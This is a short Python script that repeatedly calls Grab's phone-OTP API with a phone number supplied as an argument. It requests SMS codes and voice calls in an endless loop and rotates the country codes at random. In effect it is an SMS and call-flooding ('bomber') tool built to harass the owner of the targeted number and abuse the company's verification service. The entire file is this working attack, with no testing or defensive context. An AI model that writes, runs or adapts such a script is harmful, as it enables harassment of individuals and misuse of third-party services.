import requests
import sys
import time
import random

fewlist = sys.argv

fewofgod = 1
while True:
    fewza = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM')
    print("Send Country [" + random.choice(fewza) + "]")
    r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=TH&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
    call = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=CALL&countryCode=' + random.choice(fewza) + '&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
    fewofgod = fewofgod+1
